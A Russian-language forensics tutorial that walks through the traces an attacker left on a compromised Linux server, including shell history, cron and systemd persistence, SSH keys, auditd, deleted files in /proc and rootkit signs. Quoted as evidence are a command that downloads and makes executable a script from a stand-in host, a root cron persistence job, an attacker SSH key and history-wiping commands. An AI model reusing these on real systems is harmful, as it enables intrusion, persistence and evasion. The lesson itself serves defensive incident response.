## Вопрос, с которого всё начинается

В прошлом уроке мы восстановили компрометацию Linux-сервера по логам: брутфорс SSH, вход под root, скачивание скрипта. Теперь задача глубже: найти **все** следы атакующего на самом диске — что он запускал, как закрепился и что оставил в рабочих каталогах.

Windows ведёт централизованный журнал событий, а Linux — нет: следы разбросаны по десяткам мест. Поэтому важно знать, куда смотреть. Пройдём по артефактам того же сервера.

## Наш пример: образ сервера Linux

Начнём с самого прямого источника — **истории команд**. Оболочка `bash` пишет вводимые команды в файл `.bash_history` в домашнем каталоге пользователя:

```bash
$ cat /root/.bash_history | grep -iE 'wget|curl|chmod|/tmp'
wget http://evil.tld/run.sh -O /tmp/run.sh && chmod +x /tmp/run.sh
```

Мы видим ровно то, что предполагали по логам: скачивание скрипта в `/tmp` и выдача ему прав на исполнение (`chmod +x`). Это **прямой след** действий.

## Шаг 1: не верим пустой истории

Важная ловушка: атакующий может очистить историю (`history -c`, `unset HISTFILE`, удаление файла). Пустая `.bash_history` **не доказывает**, что команд не было. В таком случае ищем косвенные следы — в `auditd` и системных логах (мы разбирали их в `forensics-log-analysis`).

## Шаг 2: находим закрепление

Главный вопрос — как атакующий обеспечил себе возврат. В Linux персистентность живёт в **cron** (планировщик) и **systemd**. Проверяем cron:

```bash
$ cat /etc/cron.d/updater
*/5 * * * * root /tmp/run.sh
```

Строка означает: каждые 5 минут (`*/5`) от имени `root` запускать `/tmp/run.sh`. Задача лежит не в личном crontab пользователя, а в системном каталоге `/etc/cron.d/` — так её видят все. Убить скрипт бесполезно: cron запустит его снова.

Параллельно смотрим systemd-таймеры и юниты — современный аналог cron:

```bash
$ systemctl list-timers --all | grep -i updater
$ find /etc/systemd/system -newermt '2026-03-01' -ls
```

`find -newermt` ищет файлы, изменённые позже указанной даты, — так быстро вылавливают недавно добавленные юниты.

## Шаг 3: проверяем SSH-ключи

Очень популярный способ закрепиться — добавить свой **SSH-ключ** в `authorized_keys`. Тогда для входа не нужен пароль вообще:

```bash
$ cat /root/.ssh/authorized_keys
ssh-rsa AAAA... attacker@evil
```

Строка `ssh-rsa ... attacker@evil` — чужой публичный ключ. Даже если сменят пароль root, атакующий войдёт по ключу. Обратите внимание на время изменения файла (`mtime`) — оно покажет, когда ключ добавили.

## Шаг 4: детали из auditd

Если включён **auditd** (аудит ядра), он даёт самые детальные данные — вплоть до каждого запущенного процесса и обращения к файлу:

```bash
$ ausearch -m EXECVE -ts recent | grep -i run.sh | head
$ aureport --auth --summary
```

`ausearch` ищет по типу события (`EXECVE` — запуск процесса), `aureport` строит сводку. Даже если текстовые логи почистили, `auditd` часто сохраняет след.

## Шаг 5: удалённый, но открытый процесс

Классический приём малвари — удалить свой бинарь после запуска, чтобы его не нашли на диске. Но пока процесс жив, его файл остаётся **открытым**, и в `/proc` видно пометку `(deleted)`:

```bash
$ ls -l /proc/*/fd 2>/dev/null | grep '(deleted)'
lrwx------ 1 root root 64 ... /proc/1337/fd/3 -> /tmp/run.sh (deleted)
```

Файл `run.sh` удалён, но процесс 1337 держит его открытым. Извлекаем прямо из `/proc`:

```bash
$ cp /proc/1337/exe /evidence/recovered_binary
$ cp /proc/1337/fd/3 /evidence/recovered_file
```

Так восстанавливают то, что атакующий считал уничтоженным. Тот же приём работает для памяти процесса (`gcore <pid>`).

## Шаг 6: ищем руткиты и лишних пользователей

Наконец — два признака глубокого проникновения. Первый: файл `/etc/ld.so.preload`. В норме он **пуст**; если в нём что-то есть, значит подгружается чужая библиотека, перехватывающая вызовы (руткит):

```bash
$ cat /etc/ld.so.preload
```

Второй: лишние учётные записи в `/etc/passwd` — атакующие добавляют себе пользователя:

```bash
$ grep -vE 'nologin|false' /etc/passwd | head
```

Заодно проверяем `/tmp` и `/dev/shm` — излюбленные рабочие каталоги, и `dpkg`/`apt` логи, где видно, какие инструменты устанавливали.

## Шаг 7: смотрим, что устанавливали и собирали

Если атакующий ставил инструменты (сканеры, эксплойты), это видно в логах пакетного менеджера. В Debian/Ubuntu это `dpkg.log` и `apt/history.log`, в RHEL — `yum.log`:

```bash
$ grep -iE 'install' /var/log/dpkg.log | tail
$ ls -la /usr/local/bin/ | head
```

Отдельно проверяем `/usr/local/bin` — там оседают вручную собранные бинарники, которых не должно быть в системе. А файлы `.so`, изменённые позже даты начала инцидента, выдают подгруженные библиотеки:

```bash
$ find / -name '*.so' -newermt '2026-03-01' 2>/dev/null | head
```

## Что мы теперь знаем

- `.bash_history` — прямой след команд, но её могли очистить; ищите косвенные следы.
- Персистентность на Linux — `cron` (`/etc/cron*`, `/var/spool/cron`) и systemd-таймеры.
- `authorized_keys` — чужой SSH-ключ даёт вход без пароля; смотрите `mtime`.
- `auditd` (`ausearch`/`aureport`) — самый детальный источник событий.
- Удалённый, но открытый файл виден в `/proc/<pid>/fd` как `(deleted)` и извлекается из `/proc`.
- `/etc/ld.so.preload` (руткит) и лишние записи в `/etc/passwd` — признаки глубокого проникновения.
